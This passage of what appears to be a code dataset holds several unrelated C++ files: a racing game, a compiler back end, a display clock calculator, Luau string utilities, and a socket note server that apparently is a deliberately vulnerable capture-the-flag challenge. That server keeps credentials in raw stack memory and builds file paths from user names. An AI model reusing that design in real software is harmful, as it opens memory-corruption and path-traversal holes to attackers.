points[n][0]; //points[0][0]=300\n\t\tfloat ty = points[n][1]; //points[0][1]=610\n\n\t\t//smooth turn \n\t\tfloat beta = angle - atan2(tx - x, -ty + y); //\uac01\n\t\tif (sin(beta) < 0) angle += 0.005*speed; //\ud68c\uc804 \n\t\telse angle -= 0.005*speed;//\ud68c\uc804\n\n\t\tif ((x - tx)*(x - tx) + (y - ty)*(y - ty) < 25 * 25) //checkpoint\uc5d0 \uac00\uae4c\uc6cc\uc9c0\uba74\n\t\t\tn = (n + 1) % num; // n=0,1,2,3,4,5,6,7,0,1... \uc21c\uc11c\ub85c \ub3cc\uac8c \ub428\n\t}\n};\n\n\nint main()\n{\n\t//\uac8c\uc784 \ucc3d \uc0dd\uc131\n\tRenderWindow app(VideoMode(640, 480), \"Car Racing Game!\"); //\ud654\uba74 \ud06c\uae30, \ucea1\uc158 \uc774\ub984\n\tapp.setFramerateLimit(60); //\ud504\ub808\uc784 \ube44\uc728 \uc124\uc815\n\n\t//Texture: \uba54\ubaa8\ub9ac\uc5d0 \uc774\ubbf8\uc9c0\ub97c \uc801\uc7ac\n\tTexture t1, t2; \n\tt1.loadFromFile(\"images/background.png\"); //\ubc30\uacbd \ubd88\ub7ec\uc624\uae30\n\tt2.loadFromFile(\"images/car.png\"); //car \ubd88\ub7ec\uc624\uae30\n\tt1.setSmooth(true); //\ud14d\uc2a4\uccd0(\ud53d\uc140)\ub97c \ubd80\ub4dc\ub7fd\uac8c \ud568\n\tt2.setSmooth(true);\n\n\t//Sprite: Texture\ub97c \uc774\uc6a9\ud574 \ud06c\uae30, \uc0c9, \uc704\uce58, \ub85c\ud14c\uc774\uc158 \ub4f1\uc744 \uc9c0\uc815\ud574 \ud654\uba74\uc5d0 \ud45c\ud604\n\tSprite sBackground(t1), sCar(t2);\n\tsBackground.scale(2, 2);\n\n\tsCar.setOrigin(22, 22); //\uc6d0\uc810 \uc124\uc815\n\n\tconst int N = 5;\n\tCar car[N]; //N\uac1c\uc758 \uad6c\uc870\uccb4 \uc0dd\uc131\n\tfor (int i = 0; i < N; i++)\n\t{\n\t\tcar[i].x = 300 + i * 50; //\uad6c\uc870\uccb4\uc758 x\uc88c\ud45c \uc124\uc815\n\t\tcar[i].y = 1700 + i * 80; //\uad6c\uc870\uccb4\uc758 y\uc88c\ud45c \uc124\uc815\n\t\tcar[i].speed = 7 + i; //\uad6c\uc870\uccb4\uc758 speed \uc124\uc815\n\t}\n\n\tfloat speed = 0, angle = 0; //\uc18d\ub3c4, \uac01\ub3c4 \uc124\uc815\n\tfloat maxSpeed = 12.0; //\ucd5c\ub300\uc18d\ub3c4 \uc124\uc815\n\tfloat acc = 0.2, dec = 0.3; //\uac00\uc18d\n\tfloat turnSpeed = 0.08; //\ud68c\uc804\uc18d\ub3c4 \uc124\uc815\n\n\tint offsetX = 0, offsetY = 0; \n\n\t//SFML \uba54\uc778 \ub8e8\ud504: \uc708\ub3c4\uc6b0\uac00 \ub2eb\ud790 \ub54c\uae4c\uc9c0 \ubc18\ubcf5\n\twhile (app.isOpen())\n\t{\n\t\tEvent e; //\uc774\ubca4\ud2b8 \ubcc0\uc218\n\t\twhile (app.pollEvent(e)) //\uc774\ubca4\ud2b8 \ucc98\ub9ac\n\t\t{\n\t\t\tif (e.type == Event::Closed) //closed \uc774\ubca4\ud2b8 \ubc1c\uc0dd\n\t\t\t\tapp.close(); //\ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\n\t\t}\n\n\t\tbool Up = 0, Right = 0, Down = 0, Left = 0;\n\t\tif (Keyboard::isKeyPressed(Keyboard::Up)) Up = 1; //\ud0a4\ubcf4\ub4dc \uc785\ub825 = Up\n\t\tif (Keyboard::isKeyPressed(Keyboard::Right)) Right = 1; //\ud0a4\ubcf4\ub4dc \uc785\ub825 = Right\n\t\tif (Keyboard::isKeyPressed(Keyboard::Down)) Down = 1; //\ud0a4\ubcf4\ub4dc \uc785\ub825 = Down\n\t\tif (Keyboard::isKeyPressed(Keyboard::Left)) Left = 1; //\ud0a4\ubcf4\ub4dc \uc785\ub825 = Left\n\n\t\t//car movement\n\t\t//\uac11\uc791\uc2a4\ub7fd\uac8c \ubc29\ud5a5\ubcc0\ud658\uc744 \ud560 \ub54c\n\t\tif (Up && speed < maxSpeed) //Up\ud0a4\uac00 \ub20c\ub838\uace0, \uc18d\ub3c4\uac00 12\ubcf4\ub2e4 \uc791\uc744 \ub54c\n\t\t\tif (speed < 0) speed += dec; //\uc804\uc9c4\ud558\ub2e4\uac00 \ud6c4\uc9c4\ud558\ub294 \uacbd\uc6b0\n \t\t\telse  speed += acc; //\uc18d\ub3c4\ub97c \ub192\uc784\n\n\t\tif (Down && speed > -maxSpeed) //Down\ud0a4\uac00 \ub20c\ub838\uace0, \uc18d\ub3c4\uac00 -12\ubcf4\ub2e4 \ud074 \ub54c\n\t\t\tif (speed > 0) speed -= dec;  //\ud6c4\uc9c4\ud558\ub2e4\uac00 \uc804\uc9c4\ud558\ub294 \uacbd\uc6b0\n\t\t\telse  speed -= acc; //\uc18d\ub3c4\ub97c \uc904\uc784\n\n\t\tif (!Up && !Down) //Up, Down \ub458 \ub2e4 \uc548\ub20c\ub838\uc744 \ub54c: \uc815\uc9c0\n\t\t\tif (speed - dec > 0) speed -= dec; //\uc804\uc9c4\ud558\ub2e4\uac00 \uc815\uc9c0\n\t\t\telse if (speed + dec < 0) speed += dec; //\ud6c4\uc9c4\ud558\ub2e4\uac00 \uc815\uc9c0\n\t\t\telse speed = 0; //\uc815\uc9c0 \n\n\t\tif (Right && speed != 0)  angle += turnSpeed * speed / maxSpeed; //\uc6b0\ud68c\uc804\n\t\tif (Left && speed != 0)   angle -= turnSpeed * speed / maxSpeed; //\uc88c\ud68c\uc804\n\n\t\t//car[0] setting\n\t\tcar[0].speed = speed;\n\t\tcar[0].angle = angle;\n\n\t\tfor (int i = 0; i < N; i++) car[i].move(); //car \uad6c\uc870\uccb4 \ubaa8\ub450 move\n\t\tfor (int i = 1; i < N; i++) car[i].findTarget(); //car \uad6c\uc870\uccb4 [0]\uc744 \uc81c\uc678\ud558\uace0 findTarget\n\t\t\n\t\t//collision\n\t\tfloat R = 22; //collision\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ubc18\uc9c0\ub984\n\n\t\tfor (int i = 0; i < N; i++)\n\t\t\tfor (int j = 0; j < N; j++)\n\t\t\t{\n\t\t\t\tint dx = 0, dy = 0;\n\t\t\t\t//car\ub07c\ub9ac \ucda9\ub3cc\ud588\uc744 \ub54c, \uc11c\ub85c\uc758 \uc704\uce58\ub97c \ub5a8\uc5b4\ub728\ub824\uc90c \n\t\t\t\twhile (dx * dx + dy * dy < 4 * R*R) //R*R=22*22=484\n\t\t\t\t{\n\t\t\t\t\tcar[i].x += dx / 10.0; //car[i]\uc758 x\uc88c\ud45c\ub97c \ud0a4\uc6c0\n\t\t\t\t\tcar[i].y += dy / 10.0; //car[i]\uc758 y\uc88c\ud45c\ub97c \ud0a4\uc6c0\n\t\t\t\t\tcar[j].x -= dx / 10.0; //car[j]\uc758 x\uc88c\ud45c\ub97c \uc904\uc784\n\t\t\t\t\tcar[j].y -= dy / 10.0; //car[j]\uc758 y\uc88c\ud45c\ub97c \uc904\uc784 \u2192 \uc774 \uacfc\uc815\uc744 \ud1b5\ud574 \ucda9\ub3cc\uc2dc \uc11c\ub85c \ub5a8\uc5b4\uc9d0 \n\t\t\t\t\tdx = car[i].x - car[j].x; //dx = car[i].x\uc640 car[j].x\uc758 \uac70\ub9ac\ucc28\n\t\t\t\t\tdy = car[i].y - car[j].y; //dy = car[i].y\uc640 car[j].y\uc758 \uac70\ub9ac\ucc28\n\t\t\t\t\tif (!dx && !dy) break; //dx\uc640 dy \ub458 \ub2e4 0\uc774\uba74 break\n\t\t\t\t}\n\t\t\t}\n\t\t\n\t\t//car\uc758 \uc704\uce58\uc5d0 \ub530\ub77c \ubc30\uacbd\uc744 \uc774\ub3d9\uc2dc\ud0a4\uae30 \uc704\ud574 \uae30\uc900\uc774 \ub418\ub294 offset\uac12\uc744 \uc124\uc815\n\t\tif (car[0].x > 320) offsetX = car[0].x - 320; \n\t\tif (car[0].y > 240) offsetY = car[0].y - 240;\n\t\t\n\t\t//draw\n\t\tapp.clear(Color::White); //background \ud770\uc0c9\uc73c\ub85c \uc124\uc815\n\t\tsBackground.setPosition(-offsetX, -offsetY); //car\uc758 \uc704\uce58\uc5d0 \ub530\ub77c background image\uc758 \uc704\uce58\ub3c4 \ubcc0\uacbd\uc2dc\ucf1c\uc90c\n\t\tapp.draw(sBackground);\n\n\t\tColor colors[10] = { Color::Red, Color::Green, Color::Magenta, Color::Blue, Color::White };\n\n\t\t//car setting\n\t\tfor (int i = 0; i < N; i++)\n\t\t{\n\t\t\tsCar.setPosition(car[i].x - offsetX, car[i].y - offsetY); //\uc808\ub300 \uc704\uce58 \uc124\uc815\n\t\t\tsCar.setRotation(car[i].angle * 180 / 3.141593); //\uc808\ub300 \ud68c\uc804 \uc124\uc815\n\t\t\tsCar.setColor(colors[i]); //\uc0c9 \uc124\uc815\n\t\t\tapp.draw(sCar); //app\uc5d0 sprite\ub97c \uadf8\ub9bc\n\t\t}\n\n\t\tapp.display(); //\ud504\ub808\uc784\uc744 \uc2a4\ud06c\ub9b0\uc5d0 \ucd9c\ub825\n\t}\n\n\treturn 0;\n}\n",
    "#include \"../include/Objector.h\"\n\nvoid Objector::Input()\n{\n    // freopen(\"/Users/cp_cp/CS/\u5927\u4e09\u4e0a/\u7f16\u8bd1\u539f\u7406/\u5b9e\u9a8c/Compiler_C/files/test.in\", \"r\", stdin);\n    // freopen(\"../files/test.out\", \"w\", stdout);\n    string tmp;\n    cin >> tmp;\n    if (tmp == \"Syntax\")\n    {\n        cout << \"halt\" << endl;\n        bad_input = true;\n        return;\n    }\n    // cout<<tmp<<endl;\n    symbol_num = stoi(tmp);\n    // str = \"\";\n    for (int i = 1; i <= symbol_num; i++)\n    {\n        symbol tmp;\n        cin >> tmp.name >> tmp.type >> tmp.value >> tmp.offset;\n        SymbolTable.push_back(tmp);\n    }\n    cin >> temp_num >> quad_num;\n    if (quad_num == 1) // \u5982\u679c\u56db\u5143\u5f0f\u4e2a\u6570\u4e3a1\uff0c\u5219\u76f4\u63a5\u8f93\u51fahalt\n    {\n        cout << \"halt\" << endl;\n        bad_input = true;\n        return;\n    }\n    TempTable.resize(temp_num, 0); // \u521d\u59cb\u5316\u4e34\u65f6\u53d8\u91cf\n    auto t = SymbolTable.back();\n    if (!t.type)\n        Offset = t.offset + 4;\n    else\n        Offset = t.offset + 8;\n    for (int i = 1; i <= quad_num; i++) // \u8bfb\u53d6\u56db\u5143\u5f0f\n    {\n        string tmp, inputStr, str;\n        string op, arg1, arg2, result;\n        cin >> tmp;\n        cin >> inputStr;\n        int pos=inputStr.find(',');\n        op=inputStr.substr(inputStr.find('(')+1,pos-inputStr.find('(')-1);\n        arg1=inputStr.substr(pos+1,inputStr.find(',',pos+1)-pos-1);\n        pos=inputStr.find(',',pos+1);\n        arg2=inputStr.substr(pos+1,inputStr.find(',',pos+1)-pos-1);\n        pos=inputStr.find(',',pos+1);\n        result=inputStr.substr(pos+1,inputStr.find(')',pos+1)-pos-1);\n        // cout<<op<<' '<<arg1<<' '<<arg2<<' '<<result<<endl;\n        // str = \"\";\n        // quad q(vec[0], vec[1], vec[2], vec[3]);\n        quad q(op, arg1, arg2, result);\n        Arylist.push_back(q);\n    }\n    IsLabel.resize(quad_num, 0);\n    result.resize(quad_num);\n}\n\n\nvoid Objector::Genblock()\n{\n    int size = quad_num;\n    vector<int> is_in; // \u57fa\u672c\u5757\u5165\u53e3\u6570\u7ec4,\u503c\u4e3a1\u8868\u793a\u662f\u57fa\u672c\u5757\u5165\u53e3\n    is_in.resize(quad_num, 0);\n    is_in[0] = 1; // \u7b2c\u4e00\u6761\u56db\u5143\u5f0f\u662f\u5165\u53e3\n    for (int i = 0; i < quad_num; i++)\n    {\n        quad line = Arylist[i];\n        if (line.op[0]=='j')\n        {\n            \n            if (line.op == \"j\")\n            {\n                int tmp = stoi(line.result);\n                is_in[tmp] = 1;\n            }\n            else\n            {\n                int tmp = stoi(line.result);\n                is_in[tmp] = 1;\n                if (i < quad_num - 1)\n                    is_in[i + 1] = 1;\n            }\n        }\n        else if (line.op == \"R\")\n            is_in[i] = 1;\n        else if (line.op == \"W\")\n            is_in[i] = 1;\n    }\n    int i = 0;\n    while (i < quad_num)\n    {\n        quad line = Arylist[i];\n        if (is_in[i])//i\u662f\u57fa\u672c\u5757\u5165\u53e3\n        { \n            if (i == quad_num - 1)\n            {\n                BasicBlock.push_back(make_pair(i, i));\n                break;\n            }\n            for (int j = i + 1; j < quad_num; j++)\n            {\n                if (is_in[j])\n                {\n                    BasicBlock.push_back(make_pair(i, j - 1));\n                    i = j;\n                    break;\n                }\n                else if (Arylist[j].op[0] == 'j' || Arylist[j].op == \"End\")\n                {\n                    BasicBlock.push_back(make_pair(i, j));\n                    i = j + 1;\n                    break;\n                }\n            }\n        }\n        else\n            i++;\n    }\n}\n\nvoid Objector::GetLive()\n{\n    LiveTable.resize(quad_num);\n    for (auto item : BasicBlock)\n    {\n        vector<use_info> SymbolInfo(symbol_num, {-1, 1}); // \u7b26\u53f7\u8868\n        vector<use_info> TempInfo(temp_num, {-1, 0});     // \u4e34\u65f6\u53d8\u91cf\n        for (int i = item.second; i >= item.first; i--)\n        {\n            array<string, 3> ary = {Arylist[i].arg1, Arylist[i].arg2, Arylist[i].result};\n            int index;\n            for (int j = 2; j >= 0; j--)\n            {\n                if (ary[j][0] == 'T')\n                {\n                    if (ary[j].substr(0, 2) != \"TB\")\n                        index = stoi(ary[j].substr(1, ary[j].find('_') - 1)); // \u5c40\u90e8\u53d8\u91cf\n                    else\n                        index = stoi(ary[j].substr(2)); // \u5168\u5c40\u53d8\u91cf\n                    auto &vars = ary[j][1] == 'B' ? SymbolInfo : TempInfo;\n                    LiveTable[i][j] = vars[index];\n                    if (j == 2)\n                        vars[index] = {-1, 0};\n                    else\n                        vars[index] = {i, 1};\n                }\n            }\n        }\n    }\n}\n\nvoid Objector::find(string &Reg)\n{\n\n}\n\nstring Objector::GetAddress(string str) // \u83b7\u53d6\u53d8\u91cf\u5730\u5740\n{\n    int ans;\n    if (str[1] == 'B')//\u5168\u5c40\u53d8\u91cf\n        ans = SymbolTable[stoi(str.substr(2))].offset;\n    else//\u5c40\u90e8\u53d8\u91cf\n    {\n        int x = stoi(str.substr(1, str.find('_') - 1));\n        if (!TempTable[x])//\u5982\u679c\u4e34\u65f6\u53d8\u91cf\u8868\u4e2d\u6ca1\u6709\u8be5\u53d8\u91cf\n        {\n            Aval[str].insert(str);\n            TempTable[x] = Offset;\n            if (str.back() == 'i')\n                Offset += 4;\n            else\n                Offset += 8;\n        }\n        ans = TempTable[x];\n    }\n    return \"[ebp-\" + to_string(ans) + \"]\";//\u8fd4\u56de\u53d8\u91cf\u5730\u5740\n}\n\nstring Objector::",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include  <QString>\n#include <stdio.h>\nMainWindow::MainWindow(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::MainWindow)\n{\n        ui->setupUi(this);\n        //\u521b\u5efa\u72b6\u6001\u680f\n        QStatusBar* stbar =this->statusBar();\n        //\u8bbe\u7f6e\u5230\u7a97\u53e3\u4e2d\n        this->setStatusBar(stbar);\n        //\u521b\u5efalabel\u63a7\u4ef6\n         QLabel* label = new QLabel(\"V1.0                                  Copyright@haivil.wu@outlook.com\",this);\n\n         //\u5c06\u6807\u7b7e\u8bbe\u7f6e\u5230\u72b6\u6001\u680f\u4e2d\n             stbar->addWidget(label);\n}\n\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nint hsw,hbp,had,hfp;\nint vsw,vbp,vad,vfp;\nint Htotal,Vtotal;\nunsigned long int Pclk,FrameRate,MIpiclk,Bitclk,Byteclk,DSIpclk,FrameBit,Hsyc,Vsyc;\n\n MainWindow::getHswValue()\n{\n    QString str = ui->lineEdit_HSW->text();//get hsw vaule\n    hsw = str.toInt();\n    printf(\"hsw = %d\",hsw);\n    return hsw;\n}\nvoid MainWindow::on_btnCal_clicked()\n{\n\n    QString str = ui->lineEdit_HSW->text();//get hsw vaule\n    hsw = str.toInt();\n    str = ui->lineEdit_HBP->text();//get hbp value\n    hbp = str.toInt();\n    str = ui->lineEdit_HAD->text();//get had value\n    had = str.toInt();\n    str = ui->lineEdit_HFP->text();//get hfp value\n    hfp = str.toInt();\n\n    str = ui->lineEdit_VSW->text();//get vsp value\n    vsw = str.toInt();\n    str = ui->lineEdit_VBP->text();//get hbp value\n    vbp = str.toInt();\n    str = ui->lineEdit_VAD->text();//get hbp value\n    vad = str.toInt();\n    str = ui->lineEdit_VFP->text();//get hbp value\n    vfp = str.toInt();\n\n    unsigned long int Htotal = hsw + hbp + had + hfp;\n    unsigned long int Vtotal = vsw + vbp + vad + vfp;\n    unsigned long int Pclk = Htotal * Vtotal *60;\n    unsigned long int FrameRate = Pclk / Htotal / Vtotal * 10 * 10 * 10 * 10 * 10 * 10/1000000;\n    unsigned long int Mipiclk = Htotal * Vtotal * 24 * 60 / 4 / 2 ;\n    unsigned long int Bitclk = Pclk * 24 / 4;\n    unsigned long int Byteclk = Bitclk/8;\n    unsigned long int DSIpclk = Byteclk * 4 / 8;\n    unsigned long int FrameBit = Htotal * Vtotal *24;\n    unsigned long int Hsync = Pclk/Htotal/1000;\n    unsigned long int Vsync = Hsync*1000/Vtotal;\n    //htotal vtotal\n    str = str.sprintf(\"%ld\",Htotal);\n    ui->lineEdit_Htotal->setText(str);\n    str = str.sprintf(\"%ld\",Vtotal);\n    ui->lineEdit_Vtotal->setText(str);\n    //pclk\n    str = str.sprintf(\"%ld\",Pclk);\n    ui->lineEdit_Pclk->setText(str);\n    //frame rate\n    str = str.sprintf(\"%ld\",FrameRate);\n    ui->lineEdit_FrameRate->setText(str);\n    // mipi clk\n    str = str.sprintf(\"%ld\",Mipiclk);\n    ui->lineEdit_MiPiclk->setText(str);\n    //Bit clk\n    str = str.sprintf(\"%ld\",Bitclk);\n    ui->lineEdit_Bitclk->setText(str);\n    //Byte clk\n    str = str.sprintf(\"%ld\",Byteclk);\n    ui->lineEdit_byteclk->setText(str);\n    //dsi clk\n    str = str.sprintf(\"%ld\",DSIpclk);\n    ui->lineEdit_dsiclk->setText(str);\n    //frame bit\n    str = str.sprintf(\"%ld\",FrameBit);\n    ui->lineEdit_framebit->setText(str);\n    //hsync\n    str = str.sprintf(\"%ld\",Hsync);\n    ui->lineEdit_Hsync->setText(str);\n    //vsync\n    str = str.sprintf(\"%ld\",Vsync);\n    ui->lineEdit_vsync->setText(str);\n}\n\n//void MainWindow::on_btnCal_pressed()\n//{\n//    QString str = ui->lineEdit_HSW->text();//get hsw vaule\n//    hsw = str.toInt();\n//    str = ui->lineEdit_HBP->text();//get hbp value\n//    hbp = str.toInt();\n//    str = ui->lineEdit_HAD->text();//get had value\n//    had = str.toInt();\n//    str = ui->lineEdit_HFP->text();//get hfp value\n//    hfp = str.toInt();\n\n//    str = ui->lineEdit_VSW->text();//get vsp value\n//    vsw = str.toInt();\n//    str = ui->lineEdit_VBP->text();//get hbp value\n//    vbp = str.toInt();\n//    str = ui->lineEdit_VAD->text();//get hbp value\n//    vad = str.toInt();\n//    str = ui->lineEdit_VFP->text();//get hbp value\n//    vfp = str.toInt();\n//    unsigned long int Htotal = hsw + hbp + had + hfp;\n//    unsigned long int Vtotal = vsw + vbp + vad + vfp;\n//    unsigned long int Pclk = Htotal * Vtotal *60;\n//    unsigned long int FrameRate = Pclk / Htotal / Vtotal * 10 * 10 * 10 * 10 * 10 * 10/1000000;\n//    unsigned long int Mipiclk = Htotal * Vtotal * 24 * 60 / 4 / 2 ;\n//    unsigned long int Bitclk = Pclk * 24 / 4;\n//    unsigned long int Byteclk = Bitclk/8;\n//    unsigned long int DSIpclk = Byteclk * 4 / 8;\n//    unsigned long int FrameBit = Htotal * Vtotal *24;\n//    unsigned long int Hsync = Pclk/Htotal/1000;\n//    unsigned long int Vsync = Hsync*1000/Vtotal;\n//    //htotal vtotal\n//    str = str.sprintf(\"%ld\",Htotal);\n//    ui->lineEdit_Htotal->setText(str);\n//    str = str.sprintf(\"%ld\",Vtotal);\n//    ui->lineEdit_Vtotal->setText(str);\n//    //pclk\n//    str = str.sprintf(\"%ld\",Pclk);\n//    ui->lineEdit_Pclk->setText(str);\n//    //frame rate\n//    str = str.sprintf(\"%ld\",FrameRate);\n//    ui->lineEdit_FrameRate->setText(str);\n//    // mipi clk\n//    str = str.sprintf(\"%ld\",Mipiclk);\n//    ui->lineEdit_MiPiclk->setText(str);\n//    //Bit clk\n//    str = str.sprintf(\"%ld\",Bitclk);\n//    ui->lineEdit_Bitclk->setText(str);",
    "#include \"pork.h\"\n\n\nint initialize_socket(struct sockaddr_in *address) {\n    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (socket_fd == -1) {\n        return -1;\n    }\n    address->sin_family = AF_INET;\n    address->sin_addr.s_addr = INADDR_ANY;\n    address->sin_port = htons(PORT);\n    if (bind(socket_fd, (struct sockaddr *) address, sizeof(*address)) < 0) {\n        return -1;\n    }\n    if (listen(socket_fd, 10) < 0) {\n        return -1;\n    }\n    return socket_fd;\n}\n\nvoid fail_if_admin(const std::string &text) {\n    if (text.find(STRONG_USERNAME) != std::string::npos) {\n        pthread_exit(nullptr);\n    }\n}\n\nstd::unique_ptr<char[]> recv_sized(int sock, uint8_t *size) {\n    // Receiving a buffer with a custom size\n    if (recv(sock, size, 1, 0) != 1) {\n        close(sock);\n        pthread_exit(nullptr);\n    };\n    if (*size == 0xff) {\n        // No overflows allowed\n        close(sock);\n        pthread_exit(nullptr);\n    }\n    if (*size == 0) {\n        return nullptr;\n    }\n    std::unique_ptr<char[]> buffer = std::make_unique<char[]>(*size + 1);\n    buffer[*size] = '\\0';\n    int received = recv(sock, buffer.get(), *size, MSG_WAITALL);\n    if (received != *size) {\n        close(sock);\n        pthread_exit(nullptr);\n    }\n    // Admin can log in locally, but not remotely\n    fail_if_admin(buffer.get());\n    return buffer;\n}\n\n\nvoid socket_send(int sock, const char *message) {\n    uint8_t size = strlen(message);\n    send(sock, &size, 1, 0);\n    send(sock, message, size, 0);\n}\n\nvoid close_socket_and_send(int sock, const char *message) {\n    if (message != nullptr) {\n        socket_send(sock, message);\n    }\n    close(sock);\n    pthread_exit(nullptr);\n}\n\n\nchar *get_stack_safe() {\n    // Getting the safe address from the stack\n    pthread_t self = pthread_self();\n    pthread_attr_t attr;\n    pthread_getattr_np(self, &attr);\n    char *stack;\n    size_t stack_size;\n    // Getting the start of the stack page\n    pthread_attr_getstack(&attr, reinterpret_cast<void **>(&stack), &stack_size);\n    pthread_attr_destroy(&attr);\n    return stack + STACK_OFFSET;\n}\n\nconst char *get_current_user() {\n    // Getting the current user from the stack in a safe way\n    const char *stack = get_stack_safe();\n    return stack + strlen(stack) + 1;\n}\n\nvoid set_current_user(const std::string &username, const std::string &password) {\n    // Setting the current user on the stack in a safe way\n    char *stack = get_stack_safe();\n    memcpy(stack, password.c_str(), password.length());\n    *reinterpret_cast<char *>(stack + password.length()) = '\\0';\n    memcpy(stack + strlen(stack) + 1, username.c_str(), username.length());\n    if (username.empty()) {\n        // No need to null terminate the username\n        return;\n    }\n    *reinterpret_cast<char *>(stack + strlen(stack) + 1 + username.length()) = '\\0';\n}\n\nvoid login(int sock) {\n    uint8_t size;\n    auto user = recv_sized(sock, &size);\n    if (user == nullptr) {\n        close_socket_and_send(sock, \"Invalid username\");\n    }\n    check_path(user.get());\n    if (size > MAX_USERNAME_LENGTH) {\n        close_socket_and_send(sock, \"Username is too long\");\n    }\n    auto password = recv_sized(sock, &size);\n    set_current_user(user.get(), password.get());\n    if (user_exists(user.get())) {\n        if (!can_login(user.get(), get_stack_safe())) {\n            close_socket_and_send(sock, \"Invalid password\");\n        }\n    } else {\n        create_user(user.get(), get_stack_safe());\n    }\n}\n\nvoid logout() {\n    set_current_user(\"\", \"\");\n}\n\nvoid change_password(int sock) {\n    uint8_t size;\n    auto password = recv_sized(sock, &size);\n    if (password == nullptr) {\n        close_socket_and_send(sock, \"You can't set an empty password\");\n    }\n    set_current_user(get_current_user(), password.get());\n    if (!user_exists(get_current_user())) {\n        close_socket_and_send(sock, \"User does not exist\");\n    }\n    std::ofstream password_file(USERS_PATH / get_current_user() / PASSWORD_FILE, std::ios::out);\n    password_file << password.get();\n}\n\nvoid create_note_action(int sock) {\n    const char *user = get_current_user();\n    if (user == nullptr || !user_exists(user)) {\n        close_socket_and_send(sock, \"User does not exist\");\n    }\n    uint8_t size;\n    auto note = recv_sized(sock, &size);\n    if (note == nullptr) {\n        note = std::make_unique<char[]>(1);\n        note[0] = '\\0';\n    }\n    create_note(user, note.get());\n    if (get_notes_count(user) == HIGH_NUMBER_OF_NOTES && fork() != 0) {\n        pthread_exit(nullptr);\n    }\n}\n\nvoid delete_note_action(int sock) {\n    const char *user = get_current_user();\n    if (user == nullptr || !user_exists(user)) {\n        close_socket_and_send(sock, \"User does not exist\");\n    }\n    uint8_t index;\n    recv(sock, &index, 1, 0);\n    delete_note(user, index);\n}\n\nvoid get_note_action(int sock) {\n    const char *user = get_current_user();\n    if (user == nullptr || !user_exists(user)) {\n        close_socket_and_send(sock, \"User does not exist\");\n    }\n    ",
    "// This file is part of the Luau programming language and is licensed under MIT License; see LICENSE.txt for details\n#include \"StringUtils.h\"\n\n#include \"Common.h\"\n\n#include <array>\n#include <vector>\n#include <string>\n#include <string.h>\n#include <stdint.h>\n\nnamespace Luau\n{\n\nvoid vformatAppend(std::string& ret, const char* fmt, va_list args)\n{\n    va_list argscopy;\n    va_copy(argscopy, args);\n#ifdef _MSC_VER\n    int actualSize = _vscprintf(fmt, argscopy);\n#else\n    int actualSize = vsnprintf(NULL, 0, fmt, argscopy);\n#endif\n    va_end(argscopy);\n\n    if (actualSize <= 0)\n        return;\n\n    size_t sz = ret.size();\n    ret.resize(sz + actualSize);\n    vsnprintf(&ret[0] + sz, actualSize + 1, fmt, args);\n}\n\nstd::string format(const char* fmt, ...)\n{\n    std::string result;\n    va_list args;\n    va_start(args, fmt);\n    vformatAppend(result, fmt, args);\n    va_end(args);\n    return result;\n}\n\nvoid formatAppend(std::string& str, const char* fmt, ...)\n{\n    va_list args;\n    va_start(args, fmt);\n    vformatAppend(str, fmt, args);\n    va_end(args);\n}\n\nstd::string vformat(const char* fmt, va_list args)\n{\n    std::string ret;\n    vformatAppend(ret, fmt, args);\n    return ret;\n}\n\ntemplate<typename String>\nstatic std::string joinImpl(const std::vector<String>& segments, std::string_view delimiter)\n{\n    if (segments.empty())\n        return \"\";\n\n    size_t len = (segments.size() - 1) * delimiter.size();\n    for (const auto& sv : segments)\n        len += sv.size();\n\n    std::string result;\n    result.resize(len);\n    char* dest = const_cast<char*>(result.data()); // This const_cast is only necessary until C++17\n\n    auto it = segments.begin();\n    memcpy(dest, it->data(), it->size());\n    dest += it->size();\n    ++it;\n    for (; it != segments.end(); ++it)\n    {\n        memcpy(dest, delimiter.data(), delimiter.size());\n        dest += delimiter.size();\n        memcpy(dest, it->data(), it->size());\n        dest += it->size();\n    }\n\n    LUAU_ASSERT(dest == result.data() + len);\n\n    return result;\n}\n\nstd::string join(const std::vector<std::string_view>& segments, std::string_view delimiter)\n{\n    return joinImpl(segments, delimiter);\n}\n\nstd::string join(const std::vector<std::string>& segments, std::string_view delimiter)\n{\n    return joinImpl(segments, delimiter);\n}\n\nstd::vector<std::string_view> split(std::string_view s, char delimiter)\n{\n    std::vector<std::string_view> result;\n\n    while (!s.empty())\n    {\n        auto index = s.find(delimiter);\n        if (index == std::string::npos)\n        {\n            result.push_back(s);\n            break;\n        }\n        result.push_back(s.substr(0, index));\n        s.remove_prefix(index + 1);\n    }\n\n    return result;\n}\n\nsize_t editDistance(std::string_view a, std::string_view b)\n{\n    // When there are matching prefix and suffix, they end up computing as zero cost, effectively making it no-op. We drop these characters.\n    while (!a.empty() && !b.empty() && a.front() == b.front())\n    {\n        a.remove_prefix(1);\n        b.remove_prefix(1);\n    }\n\n    while (!a.empty() && !b.empty() && a.back() == b.back())\n    {\n        a.remove_suffix(1);\n        b.remove_suffix(1);\n    }\n\n    // Since we know the edit distance is the difference of the length of A and B discounting the matching prefixes and suffixes,\n    // it is therefore pointless to run the rest of this function to find that out. We immediately infer this size and return it.\n    if (a.empty())\n        return b.size();\n    if (b.empty())\n        return a.size();\n\n    size_t maxDistance = a.size() + b.size();\n\n    std::vector<size_t> distances((a.size() + 2) * (b.size() + 2), 0);\n    auto getPos = [b](size_t x, size_t y) -> size_t\n    {\n        return (x * (b.size() + 2)) + y;\n    };\n\n    distances[0] = maxDistance;\n\n    for (size_t x = 0; x <= a.size(); ++x)\n    {\n        distances[getPos(x + 1, 0)] = maxDistance;\n        distances[getPos(x + 1, 1)] = x;\n    }\n\n    for (size_t y = 0; y <= b.size(); ++y)\n    {\n        distances[getPos(0, y + 1)] = maxDistance;\n        distances[getPos(1, y + 1)] = y;\n    }\n\n    std::array<size_t, 256> seenCharToRow;\n    seenCharToRow.fill(0);\n\n    for (size_t x = 1; x <= a.size(); ++x)\n    {\n        size_t lastMatchedY = 0;\n\n        for (size_t y = 1; y <= b.size(); ++y)\n        {\n            // The value of b[N] can be negative with unicode characters\n            unsigned char bSeenCharIndex = static_cast<unsigned char>(b[y - 1]);\n            size_t x1 = seenCharToRow[bSeenCharIndex];\n            size_t y1 = lastMatchedY;\n\n            size_t cost = 1;\n            if (a[x - 1] == b[y - 1])\n            {\n                cost = 